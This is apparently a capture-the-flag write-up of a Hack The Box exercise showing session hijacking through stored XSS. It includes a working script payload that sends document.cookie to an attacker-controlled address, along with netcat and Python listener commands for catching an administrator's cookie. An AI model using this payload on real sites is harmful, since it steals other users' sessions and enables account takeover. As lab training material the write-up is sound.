# Session Hijacking // Stored XSS

HTTP is stateless; this means that each request will be executed independently without any information about previously executed requests. This means you will have to re-enter your username and password for any page you view. Therefore, developers need to create a way for you to monitor the status between multiple connections from the same user, rather than requiring them to re-authenticate after every click on a web app. This method is called session.



## What is Session Hijacking ?

Generally, in web-based exploits, our goal is to capture a user more authorized than us. In practice, we will try to get a new session using the xss vulnerability. Since websites store our information through cookies, our goal will be to get the documentcookie code. Documentcookie is the cookie of the admin account in the system.

> ```
> Tried on a box on Hackthebox platform.
> ```



## Xss Detection

I will try to add java script code with \<script> tag to one of the information that will be permanently on our page. If html tags work on user inputs, that is, if html tags are not filtered, I should be able to use script tags. Let's jump in.

<img src="/root/.config/Typora/typora-user-images/image-20210620073656881.png" alt="image-20210620073656881" style="zoom:67%;" />





<img src="/root/.config/Typora/typora-user-images/image-20210620074121907.png" alt="image-20210620074121907" style="zoom:67%;" />



The alert function opens a window and writes the data you want. If this code works, we will be able to receive cookies from every person who enters the page. Because the code we wrote will work for everyone. It will be located in the source code of our profile page.

![image-20210620074441310](/root/.config/Typora/typora-user-images/image-20210620074441310.png)

### Payload

~~~javascript
```
<script> document.location= "http://10.10.14.x:8000/index.php?c=" + document.cookie; </script>
```
~~~

   

We changed the code like this and injected it into our page. Then, when the cookie is sent to us, we need to listen to our port in order to catch it. What we need to do now is to wait for a qualified user to enter our profile. You can use both;

~~~python
```
python3 -m http.server 8000
python2 -m SimpleHttpServer 8000
```
~~~

~~~bash
```
nc -nlvp 8000
```
~~~

Now all we have to do is wait. Using the following cookie.

![image-20210620075725989](/root/.config/Typora/typora-user-images/image-20210620075725989.png)



![image-20210620075824891](/root/.config/Typora/typora-user-images/image-20210620075824891.png)

![image-20210620075840220](/root/.config/Typora/typora-user-images/image-20210620075840220.png)



## Session has been stolen!

